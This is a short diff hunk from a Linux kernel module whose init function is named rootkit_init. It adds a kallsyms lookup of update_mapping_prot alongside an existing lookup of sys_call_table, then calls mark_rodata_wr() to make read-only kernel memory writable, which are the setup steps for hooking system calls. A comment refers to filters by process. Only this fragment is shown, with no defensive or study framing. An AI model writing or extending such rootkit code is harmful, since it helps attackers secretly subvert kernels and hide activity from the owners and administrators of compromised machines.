@@ -226,7 +226,11 @@ static int __init rootkit_init(void) {
   sys_call_table_p = (syscall_fn_t *)kallsyms_lookup_name_fn("sys_call_table");
   // TODO: check type of update_mapping_prot
   pr_info("sys_call_table at %p\n", sys_call_table_p);
-
+  update_mapping_prot = (void *)kallsyms_lookup_name_fn("update_mapping_prot");
+  if (!update_mapping_prot) {
+    pr_err("Failed to find update_mapping_prot\n");
+    return -1;
+  }
   mark_rodata_wr();
 
   // list of all filters by process
